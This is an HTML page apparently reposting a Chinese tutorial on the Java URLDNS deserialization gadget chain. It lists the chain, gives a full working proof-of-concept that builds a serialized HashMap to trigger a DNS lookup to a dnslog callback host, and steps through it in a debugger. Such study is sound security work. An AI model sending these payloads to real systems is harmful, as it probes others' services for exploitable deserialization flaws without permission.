@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://stashgithub.github.io/news/article-36346.htm" />
+    <meta charset="utf-8">
+    <title>URLDNS反序列化链学习</title>
+        <meta name="description" content="URLDNS跟CommonsCollections比起来真是眉清目秀，该链主要用于验证漏洞，并不能执行命令，优点就是不依赖任何包。 1、利用链  *   Gadget Chain:  *     Ha" />
+        <link rel="icon" href="/assets/website/img/stashgithub/favicon.ico" type="image/x-icon"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <!-- Google Web Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Raleway:wght@600;800&display=swap" rel="stylesheet">
+    <!-- Icon Font Stylesheet -->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" />
+    <link href="https://cdn.bootcdn.net/ajax/libs/bootstrap-icons/1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+    <!-- Libraries Stylesheet -->
+    <link href="/assets/website/js/frontend/stashgithub/lightbox/css/lightbox.min.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/stashgithub/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+    <!-- Customized Bootstrap Stylesheet -->
+    <link href="/assets/website/css/stashgithub/bootstrap.min.css" rel="stylesheet">
+    <!-- Template Stylesheet -->
+    <link href="/assets/website/css/stashgithub/style.css" rel="stylesheet">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NNXJ21P00N"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-NNXJ21P00N');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+        <!-- Spinner Start -->
+    <div id="spinner" class="show w-100 vh-100 bg-white position-fixed translate-middle top-50 start-50  d-flex align-items-center justify-content-center">
+        <div class="spinner-grow text-primary" role="status"></div>
+    </div>
+    <!-- Spinner End -->
+    <!-- Navbar start -->
+    <div class="container-fluid fixed-top">
+        <div class="container topbar bg-primary d-none d-lg-block">
+            <div class="d-flex justify-content-between">
+                
+            </div>
+        </div>
+        <div class="container px-0">
+            <nav class="navbar navbar-light bg-white navbar-expand-xl">
+                                <a href="/" class="navbar-brand">
+                    <span class="text-primary display-6">Stash Github</span>
+                </a>
+                                <button class="navbar-toggler py-2 px-3" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse">
+                    <span class="fa fa-bars text-primary"></span>
+                </button>
+                <div class="collapse navbar-collapse bg-white" id="navbarCollapse">
+                    <div class="navbar-nav mx-auto">
+                                                <a href="/" class="nav-item nav-link">首页</a>
+                                                <a href="/free-nodes/" class="nav-item nav-link">免费节点</a>
+                                                <a href="/paid-subscribe/" class="nav-item nav-link">推荐机场</a>
+                                                <a href="/news/" class="nav-item nav-link">新闻资讯</a>
+                                                <a href="#" class="nav-item nav-link">关于</a>
+                        <a href="#" class="nav-item nav-link">联系</a>
+                    </div>
+                </div>
+            </nav>
+        </div>
+    </div>
+    <!-- Navbar End -->
+    <!-- Single Page Header start -->
+    <div class="container-fluid page-header py-5">
+        <h1 class="text-center text-white display-6">URLDNS反序列化链学习</h1>
+        <ol class="breadcrumb justify-content-center mb-0">
+            <li class="breadcrumb-item"><a href="/">首页</a></li>
+            <li class="breadcrumb-item"><a href="/news/">新闻资讯</a></li>
+            <li class="breadcrumb-item active text-white">正文</li>
+        </ol>
+    </div>
+    <!-- Single Page Header End -->
+    <!-- Fruits Shop Start-->
+    <div class="container-fluid fruite py-5">
+        <div class="container py-2">
+            <div class="row">
+                <div class="col-md-9">
+                                    <input type="hidden" id="share-website-info" data-name="StashNode免费订阅官网" data-url="https://stashnode.github.io">
+                  				  				  				</h1> <p>URLDNS跟CommonsCollections比起来真是眉清目秀，该链主要用于验证漏洞，并不能执行命令，优点就是不依赖任何包。</p> <h2 id="1利用链">1、利用链</h2> <pre><code class="language-java"> *   Gadget Chain:  *     HashMap.readObject()  *       HashMap.putVal()  *         HashMap.hash()  *           URL.hashCode()    		URLStreamHandler.hashCode()    		  URLStreamHandler.getHostAddress()</code></pre> <p>其实看这个利用链我们就能发现其实跟cc6的利用是差不多的。</p> <h2 id="2poc">2、POC</h2> <h3 id="21漏洞复现">2.1、漏洞复现</h3> <pre><code class="language-java">import java.io.*; import java.lang.reflect.Field; import java.net.*; import java.util.HashMap; import java.net.URLStreamHandler; import java.util.HashMap;  public class URLDNS {     public static void main(String[] args) throws Exception {         String url="http://wmm760.dnslog.cn";         URLStreamHandler handler = new SilentURLStreamHandler();          HashMap ht = new HashMap(); // HashMap that will contain the URL         URL u = new URL(null, url, handler); // URL to use as the Key         ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.          Field hashCode = URL.class.getDeclaredField("hashCode");         hashCode.setAccessible(true);         hashCode.set(u, -1);          serialize(ht);         unserialize();      }     static class SilentURLStreamHandler extends URLStreamHandler {          protected URLConnection openConnection(URL u) throws IOException {             return null;         }          protected synchronized InetAddress getHostAddress(URL u) {             return null;         }     }       public static void serialize(Object obj ) throws Exception{         ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.bin"));         objectOutputStream.writeObject(obj);     }     public static void unserialize() throws Exception{         ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.bin"));         objectInputStream.readObject();     } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/181ad4477bdb729fd1e6ecfd8c9b3b28.jpg" alt="URLDNS反序列化链学习"></p> <h3 id="22poc分析">2.2、POC分析</h3> <p>其实创建了一个空的URLStreamHandler，把它放进我们的创建的URL类（放着我们的验证dnslog），再把 他们放进HashMap，通过反射去修改URL的hashCode属性为-1。</p> <pre><code class="language-java">String url="http://wmm760.dnslog.cn"; URLStreamHandler handler = new SilentURLStreamHandler();  HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.  Field hashCode = URL.class.getDeclaredField("hashCode"); hashCode.setAccessible(true); hashCode.set(u, -1);</code></pre> <p><strong>URLStreamHandler</strong></p> <p>我们看第一段的URLStreamHandler类的hashcode方法,他会把我们的传进去的URL通过getHostAddress触发，我们现在需要查找哪里调用了URLStreamHandler的hashCode()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/256e57c27641b0a9913af731e4ca7173.jpg" alt="URLDNS反序列化链学习"></p> <p><strong>URL</strong></p> <p>在URL类中的hashCode方法，如果hashCode不等于-1，就会直接返回，这就是我们为什么要反射 设置hashCode为-1的原因，handler其实就是我们在URL构造方法传入的URLStreamHandler，所以这里调用的是URLStreamHandler的hashCode方法，并且this就是我们的通过构造方法传入的URL类。再往上找哪里调用hashCode方法，这时我们就可以想到cc6链的运用了。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/05ed511c98a283602b53f9fa0078e830.jpg" alt="URLDNS反序列化链学习"></p> <p>那就是HashMap</p> <p>HashMap的hash方法会用传入的key去调用key的hashcode方法，所以我们只要把URL类传给HashMap的key就可以了。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/8bd211c9551e715ecbb31b5a8d536edb.jpg" alt="URLDNS反序列化链学习"></p> <p>再通过readObject的putVal调用即可</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/141325133b51dbe8c620fdc02e2687fa.jpg" alt="URLDNS反序列化链学习"></p> <h3 id="23poc调试">2.3、POC调试</h3> <p>首先我们在HashMap的readObject打下断点，可以看到key就是我们的URL类，value是一个"恶意网址"，用于条件判断</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/d7dca10b6eb1afd45beb556e51b0fb2c.jpg" alt="URLDNS反序列化链学习"></p> <p>进入到HashMap的hash方法，调用key的hashCode方法就是调用URL的hashCode方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/f7a9daa7f3f8b020da80205cb4e19b99.jpg" alt="URLDNS反序列化链学习"></p> <p>handler就是URLStreamHandler，在new URL()传入的，this是本类URL类，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/bbed8ad3471e511fed13cc5b6a8093ad.jpg" alt="URLDNS反序列化链学习"></p> <p>URLStreamHandler的hashCode方法，他会调用getHostAddress方法，该方法会去远程请求，多说一句也是我们审计用来审计ssrf漏洞的常用函数</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/a9758ea1baaf23685a9748494f601598.jpg" alt="URLDNS反序列化链学习"></p> <p>在这句代码会请求两三秒的样子，dnslog成功收到。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/b6d891db9dd51f8bc3a4657e5d4035fa.jpg" alt="URLDNS反序列化链学习"></p> <h3 id="24结尾">2.4、结尾</h3> <p>总体来说这条链是比较简单的，但是就是不能够执行命令</p> <p>参考链接</p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java"  target="_blank" rel="nofollow">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-36140.htm">python读取文件夹的文件名</a></p>
+                                        <p>下一个：<a href="/news/article-36347.htm">投资医美要多少钱（投资 医美）</a></p>
+                                    </div>
+                                </div>
+                <div class="col-md-3">
+                    <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/news/article-33968.htm" title="淮北动物救助（淮北动物救助站电话）">淮北动物救助（淮北动物救助站电话）</a></li>
+                        <li class="py-2"><a href="/news/article-21798.htm" title="Feign优化之Client选择">Feign优化之Client选择</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-12-3-free-high-speed-nodes.htm" title="「12月3日」最高速度19.5M/S，2024年Stash Github每天更新免费机场订阅节点链接">「12月3日」最高速度19.5M/S，2024年Stash Github每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/news/article-19053.htm" title="element-plus  一个vue3.xUI框架 （element-ui的3.x 版初体验）">element-plus  一个vue3.xUI框架 （element-ui的3.x 版初体验）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-12-28-free-vless-node.htm" title="「12月28日」最高速度18.2M/S，2024年Stash Github每天更新免费机场订阅节点链接">「12月28日」最高速度18.2M/S，2024年Stash Github每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-10-11-vless-node.htm" title="「10月11日」最高速度21.7M/S，2024年Stash Github每天更新免费机场订阅节点链接">「10月11日」最高速度21.7M/S，2024年Stash Github每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-10-19-free-high-speed-nodes.htm" title="「10月19日」最高速度20.3M/S，2024年Stash Github每天更新免费机场订阅节点链接">「10月19日」最高速度20.3M/S，2024年Stash Github每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-5-today-vless-node.htm" title="「11月5日」最高速度22.7M/S，2024年Stash Github每天更新免费机场订阅节点链接">「11月5日」最高速度22.7M/S，2024年Stash Github每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-20-vless-node-share.htm" title="「11月20日」最高速度21.6M/S，2024年Stash Github每天更新免费机场订阅节点链接">「11月20日」最高速度21.6M/S，2024年Stash Github每天更新免费机场订阅节点链接</a></li>
+                        <li class="py-2"><a href="/news/article-19509.htm" title="通过winsw将SpringBoot可运行jar包做成后台服务，启动运行">通过winsw将SpringBoot可运行jar包做成后台服务，启动运行</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">18</span> <a href="/date/2025-01/" title="2025-01 归档">2025-01</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">92</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">31</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">25</span> <a href="/date/2024-10/" title="2024-10 归档">2024-10</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Fruits Shop End-->
+        <!-- Copyright Start -->
+    <div class="container-fluid copyright bg-dark py-4">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12 text-center mb-3 mb-md-0">
+                            <p>
+                                <a href="/">首页</a> | 
+                                <a href="/free-node/">免费节点</a> | 
+                                <a href="/news/">新闻资讯</a> |
+                                <a href="/about-us.htm">关于我们</a> |
+                                <a href="/disclaimer.htm">免责申明</a> |
+                                <a href="/privacy.htm">隐私申明</a> |
+                                <a href="/sitemap.xml">网站地图</a>
+                            </p>
+                    <span class="text-light">Stash Github机场分享官网 版权所有 Powered by WordPress</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Copyright End -->
+    <!-- Back to Top -->
+    <a href="#" class="btn btn-primary border-3 border-primary rounded-circle back-to-top"><i class="fa fa-arrow-up"></i></a>
+    <!-- JavaScript Libraries -->
+    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.0.0/js/bootstrap.bundle.min.js"></script>
+    <script src="/assets/website/js/frontend/stashgithub/easing/easing.min.js"></script>
+    <script src="/assets/website/js/frontend/stashgithub/waypoints/waypoints.min.js"></script>
+    <script src="/assets/website/js/frontend/stashgithub/lightbox/js/lightbox.min.js"></script>
+    <script src="/assets/website/js/frontend/stashgithub/owlcarousel/owl.carousel.min.js"></script>
+    <!-- Template Javascript -->
+    <script src="/assets/website/js/frontend/stashgithub/main.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
+    <script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
